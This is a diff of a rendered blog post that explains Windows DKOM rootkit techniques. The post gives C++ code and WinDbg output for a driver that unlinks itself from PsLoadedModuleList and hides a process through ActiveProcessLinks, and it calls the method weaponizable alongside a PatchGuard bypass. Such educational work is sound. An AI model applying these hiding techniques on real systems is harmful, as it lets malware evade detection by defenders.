@@ -65,13 +65,13 @@
         </div>
     </header>
 
-    <p>This is an implementation of a simple driver which modifies kernel data structures to remove itself from the <code class="highlighter-rouge">PsLoadedModuleList</code> structure. Disclaimer: PG protects against this. Weaponizanble by chaining with a PG bypass.</p>
+    <p>This is an implementation of a simple driver which modifies kernel data structures to remove itself from the <code class="language-plaintext highlighter-rouge">PsLoadedModuleList</code> structure. Disclaimer: PG protects against this. Weaponizanble by chaining with a PG bypass.</p>
 
 <hr />
 
-<p><code class="highlighter-rouge">PsLoadedModuleList</code>  is a global kernel object of type <code class="highlighter-rouge">_KLDR_DATA_TABLE_ENTRY</code>. It is the list head of a circular linked-list containing the loaded modules on the system. Example:</p>
+<p><code class="language-plaintext highlighter-rouge">PsLoadedModuleList</code>  is a global kernel object of type <code class="language-plaintext highlighter-rouge">_KLDR_DATA_TABLE_ENTRY</code>. It is the list head of a circular linked-list containing the loaded modules on the system. Example:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; ?PsLoadedModuleList
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; ?PsLoadedModuleList
 Evaluate expression: -8773737086640 = fffff805`34848150
 2: kd&gt; dt poi(fffff805`34848150) _KLDR_DATA_TABLE_ENTRY
 DKOM_Demo!_KLDR_DATA_TABLE_ENTRY
@@ -94,17 +94,17 @@ DKOM_Demo!_KLDR_DATA_TABLE_ENTRY
    +0x088 PatchInformation : 0x00000000`00000001 Void
 </code></pre></div></div>
 
-<p>We can see that at information about the entry is offset to the actual <code class="highlighter-rouge">LIST_ENTRY</code> structure, which holds the addresses of the next and previous <code class="highlighter-rouge">_KLDR_DATA_TABLE_ENTRY</code> structures. If you’re not familiar, <code class="highlighter-rouge">LIST_ENTRY</code> looks like this:</p>
+<p>We can see that at information about the entry is offset to the actual <code class="language-plaintext highlighter-rouge">LIST_ENTRY</code> structure, which holds the addresses of the next and previous <code class="language-plaintext highlighter-rouge">_KLDR_DATA_TABLE_ENTRY</code> structures. If you’re not familiar, <code class="language-plaintext highlighter-rouge">LIST_ENTRY</code> looks like this:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; dt _List_entry
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; dt _List_entry
 ntdll!_LIST_ENTRY
    +0x000 Flink            : Ptr64 _LIST_ENTRY
    +0x008 Blink            : Ptr64 _LIST_ENTRY
 </code></pre></div></div>
 
-<p>As it turns out, each driver has access to it’s <code class="highlighter-rouge">KLDR_DATA_TABLE_ENTRY</code> structure by its <code class="highlighter-rouge">DriverObject-&gt;DriverSection</code> member at offset <code class="highlighter-rouge">0x28</code>. Just for completeness’ sake, the <code class="highlighter-rouge">DRIVER_OBJECT</code> structure looks like this:</p>
+<p>As it turns out, each driver has access to it’s <code class="language-plaintext highlighter-rouge">KLDR_DATA_TABLE_ENTRY</code> structure by its <code class="language-plaintext highlighter-rouge">DriverObject-&gt;DriverSection</code> member at offset <code class="language-plaintext highlighter-rouge">0x28</code>. Just for completeness’ sake, the <code class="language-plaintext highlighter-rouge">DRIVER_OBJECT</code> structure looks like this:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; dt PDRIVER_OBJECT
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; dt PDRIVER_OBJECT
 DKOM_Demo!PDRIVER_OBJECT
 Ptr64    +0x000 Type             : Int2B
    +0x002 Size             : Int2B
@@ -123,63 +123,63 @@ Ptr64    +0x000 Type             : Int2B
    +0x070 MajorFunction    : [28] Ptr64     long 
 </code></pre></div></div>
 
-<p>As such, one can simply access and traverse <code class="highlighter-rouge">PsLoadedModuleList</code> using this member of <code class="highlighter-rouge">DRIVER_OBJECT</code>. Additionally, directly hiding a module from the list is as simple as relinking the <code class="highlighter-rouge">LIST_ENTRY</code> structures surrounding the driver’s:</p>
+<p>As such, one can simply access and traverse <code class="language-plaintext highlighter-rouge">PsLoadedModuleList</code> using this member of <code class="language-plaintext highlighter-rouge">DRIVER_OBJECT</code>. Additionally, directly hiding a module from the list is as simple as relinking the <code class="language-plaintext highlighter-rouge">LIST_ENTRY</code> structures surrounding the driver’s:</p>
 
 <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PLIST_ENTRY</span> <span class="n">PrevModule</span> <span class="o">=</span> <span class="n">ThisModule</span><span class="o">-&gt;</span><span class="n">Blink</span><span class="p">;</span>
 <span class="n">PLIST_ENTRY</span> <span class="n">NextModule</span> <span class="o">=</span> <span class="n">ThisModule</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
 
-<span class="c1">// Replace PrevModule Flink with NextModule's address;
-</span><span class="n">PrevModule</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">NextModule</span><span class="p">;</span>
-<span class="c1">// Replace NextModule Blink with PrevModule's address
-</span><span class="n">NextModule</span><span class="o">-&gt;</span><span class="n">Blink</span> <span class="o">=</span> <span class="n">PrevModule</span><span class="p">;</span>
+<span class="c1">// Replace PrevModule Flink with NextModule's address;</span>
+<span class="n">PrevModule</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">NextModule</span><span class="p">;</span>
+<span class="c1">// Replace NextModule Blink with PrevModule's address</span>
+<span class="n">NextModule</span><span class="o">-&gt;</span><span class="n">Blink</span> <span class="o">=</span> <span class="n">PrevModule</span><span class="p">;</span>
 
-<span class="c1">// point target process to itself
-</span><span class="n">ThisModule</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">ThisModule</span><span class="p">;</span>
+<span class="c1">// point target process to itself</span>
+<span class="n">ThisModule</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">ThisModule</span><span class="p">;</span>
 <span class="n">ThisModule</span><span class="o">-&gt;</span><span class="n">Blink</span> <span class="o">=</span> <span class="n">ThisModule</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>And since you have access to the driver <code class="highlighter-rouge">KLDR_DATA_TABLE_ENTRY</code>, you can check your work:</p>
+<p>And since you have access to the driver <code class="language-plaintext highlighter-rouge">KLDR_DATA_TABLE_ENTRY</code>, you can check your work:</p>
 
 <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NTSTATUS</span> <span class="nf">FindKernelModule</span><span class="p">(</span><span class="n">_In_</span> <span class="n">PDRIVER_OBJECT</span> <span class="n">DriverObject</span><span class="p">,</span> <span class="n">_In_</span> <span class="n">PUNICODE_STRING</span> <span class="n">DriverName</span><span class="p">)</span> <span class="p">{</span>
-	<span class="c1">// Logic can be similarly used for finding the PsLoadedModuleList head. ntoskrnl.exe is always the head
-</span>	<span class="n">PKLDR_DATA_TABLE_ENTRY</span> <span class="n">pThisModule</span> <span class="o">=</span> <span class="p">(</span><span class="n">PKLDR_DATA_TABLE_ENTRY</span><span class="p">)</span><span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">DriverSection</span><span class="p">;</span>
+	<span class="c1">// Logic can be similarly used for finding the PsLoadedModuleList head. ntoskrnl.exe is always the head</span>
+	<span class="n">PKLDR_DATA_TABLE_ENTRY</span> <span class="n">pThisModule</span> <span class="o">=</span> <span class="p">(</span><span class="n">PKLDR_DATA_TABLE_ENTRY</span><span class="p">)</span><span class="n">DriverObject</span><span class="o">-&gt;</span><span class="n">DriverSection</span><span class="p">;</span>
 	<span class="n">PLIST_ENTRY</span> <span class="n">KModEntry</span> <span class="o">=</span> <span class="p">{</span> <span class="nb">nullptr</span> <span class="p">};</span>
 	<span class="n">PLIST_ENTRY</span> <span class="n">FirstEntry</span> <span class="o">=</span> <span class="n">pThisModule</span><span class="o">-&gt;</span><span class="n">InLoadOrderLinks</span><span class="p">.</span><span class="n">Flink</span><span class="p">;</span>
 
-	<span class="c1">// https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
-</span>	<span class="c1">// Loop over the circular linked-list
-</span>	<span class="k">for</span> <span class="p">(</span><span class="n">PLIST_ENTRY</span> <span class="n">pListEntry</span> <span class="o">=</span> <span class="n">pThisModule</span><span class="o">-&gt;</span><span class="n">InLoadOrderLinks</span><span class="p">.</span><span class="n">Flink</span><span class="p">;</span>
+	<span class="c1">// https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo</span>
+	<span class="c1">// Loop over the circular linked-list</span>
+	<span class="k">for</span> <span class="p">(</span><span class="n">PLIST_ENTRY</span> <span class="n">pListEntry</span> <span class="o">=</span> <span class="n">pThisModule</span><span class="o">-&gt;</span><span class="n">InLoadOrderLinks</span><span class="p">.</span><span class="n">Flink</span><span class="p">;</span>
 		<span class="p">(</span><span class="n">pListEntry</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">pThisModule</span><span class="o">-&gt;</span><span class="n">InLoadOrderLinks</span><span class="p">)</span> <span class="o">&amp;</span>
 		<span class="p">(</span><span class="n">pThisModule</span><span class="o">-&gt;</span><span class="n">InLoadOrderLinks</span><span class="p">.</span><span class="n">Flink</span> <span class="o">!=</span> <span class="n">FirstEntry</span><span class="p">);</span>
 		<span class="n">pListEntry</span> <span class="o">=</span> <span class="n">pListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">)</span>
 	<span class="p">{</span>
-		<span class="c1">// Search for the driver you're trying to hide
-</span>		<span class="n">PKLDR_DATA_TABLE_ENTRY</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="n">CONTAINING_RECORD</span><span class="p">(</span>
+		<span class="c1">// Search for the driver you're trying to hide</span>
+		<span class="n">PKLDR_DATA_TABLE_ENTRY</span> <span class="n">pEntry</span> <span class="o">=</span> <span class="n">CONTAINING_RECORD</span><span class="p">(</span>
 			<span class="n">pListEntry</span><span class="p">,</span> <span class="n">KLDR_DATA_TABLE_ENTRY</span><span class="p">,</span> <span class="n">InLoadOrderLinks</span><span class="p">);</span>
 
 		<span class="k">if</span> <span class="p">(</span><span class="n">RtlEqualUnicodeString</span><span class="p">(</span><span class="n">DriverName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pEntry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">,</span> <span class="nb">true</span><span class="p">))</span> <span class="p">{</span>
-			<span class="c1">// oops, you found it. 
-</span>			<span class="n">KModEntry</span> <span class="o">=</span> <span class="n">pListEntry</span><span class="p">;</span>
+			<span class="c1">// oops, you found it. </span>
+			<span class="n">KModEntry</span> <span class="o">=</span> <span class="n">pListEntry</span><span class="p">;</span>
 			<span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
 		<span class="p">}</span>
 	<span class="p">}</span>
 
-    <span class="c1">// module was unlinked successfully
-</span>	<span class="k">return</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+    <span class="c1">// module was unlinked successfully</span>
+	<span class="k">return</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>This same type of unlinking behavior can be used to hide a process. In kernel mode, a process can be looked up by its ID using <code class="highlighter-rouge">PsLookupProcessByProcessId</code>:</p>
+<p>This same type of unlinking behavior can be used to hide a process. In kernel mode, a process can be looked up by its ID using <code class="language-plaintext highlighter-rouge">PsLookupProcessByProcessId</code>:</p>
 
-<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// turn the PID into an EPROCESS pointer
-</span><span class="n">PEPROCESS</span> <span class="n">Process</span><span class="p">;</span>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// turn the PID into an EPROCESS pointer</span>
+<span class="n">PEPROCESS</span> <span class="n">Process</span><span class="p">;</span>
 <span class="n">status</span> <span class="o">=</span> <span class="n">PsLookupProcessByProcessId</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">data</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Process</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">NT_SUCCESS</span><span class="p">(</span><span class="n">status</span><span class="p">))</span>
 	<span class="k">break</span><span class="p">;</span>
 </code></pre></div></div>
 
 <p>Where PEPROCESS represent a pointer to an EPROCESS structure like this:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; dt _EPROCESS
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: kd&gt; dt _EPROCESS
 ntdll!_EPROCESS
    +0x000 Pcb              : _KPROCESS
    +0x2e0 ProcessLock      : _EX_PUSH_LOCK
@@ -190,23 +190,23 @@ ntdll!_EPROCESS
 ... (truncated
 </code></pre></div></div>
 
-<p>With a pointer to the target process’s EPROCESS structure in hand, it can be scanned for the <code class="highlighter-rouge">ActiveProcessLinks</code> member. Once this member is found, hiding the process is the exact same for hiding a driver process:</p>
+<p>With a pointer to the target process’s EPROCESS structure in hand, it can be scanned for the <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> member. Once this member is found, hiding the process is the exact same for hiding a driver process:</p>
 
-<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// get the ActiveProcesLinks address
-</span><span class="k">auto</span> <span class="n">CurrentListEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLIST_ENTRY</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">Process</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// get the ActiveProcesLinks address</span>
+<span class="k">auto</span> <span class="n">CurrentListEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PLIST_ENTRY</span><span class="p">)((</span><span class="n">PUCHAR</span><span class="p">)</span><span class="n">Process</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
 
 <span class="k">auto</span> <span class="n">PrevListEntry</span> <span class="o">=</span> <span class="n">CurrentListEntry</span><span class="o">-&gt;</span><span class="n">Blink</span><span class="p">;</span>
 <span class="k">auto</span> <span class="n">NextListEntry</span> <span class="o">=</span> <span class="n">CurrentListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
 
-<span class="c1">// unlink the target process
-</span><span class="n">PrevListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">NextListEntry</span><span class="p">;</span>
+<span class="c1">// unlink the target process</span>
+<span class="n">PrevListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">NextListEntry</span><span class="p">;</span>
 <span class="n">NextListEntry</span><span class="o">-&gt;</span><span class="n">Blink</span> <span class="o">=</span> <span class="n">PrevListEntry</span><span class="p">;</span>
 
-<span class="c1">// point target process to itself
-</span><span class="n">CurrentListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">CurrentListEntry</span><span class="p">;</span>
+<span class="c1">// point target process to itself</span>
+<span class="n">CurrentListEntry</span><span class="o">-&gt;</span><span class="n">Flink</span> <span class="o">=</span> <span class="n">CurrentListEntry</span><span class="p">;</span>
 <span class="n">CurrentListEntry</span><span class="o">-&gt;</span><span class="n">Blink</span> <span class="o">=</span> <span class="n">CurrentListEntry</span><span class="p">;</span>
 </code></pre></div></div>
-<p>On Windows 10 1901 build 18363, the <code class="highlighter-rouge">ActiveProcessLinks</code> member is located at offset 0x2f0. This offset changes between builds.</p>
+<p>On Windows 10 1901 build 18363, the <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> member is located at offset 0x2f0. This offset changes between builds.</p>
 
 <p>The full source for an example driver can be found <a href="https://github.com/joshfinley/DKOM_Demo">here</a>.</p>
 
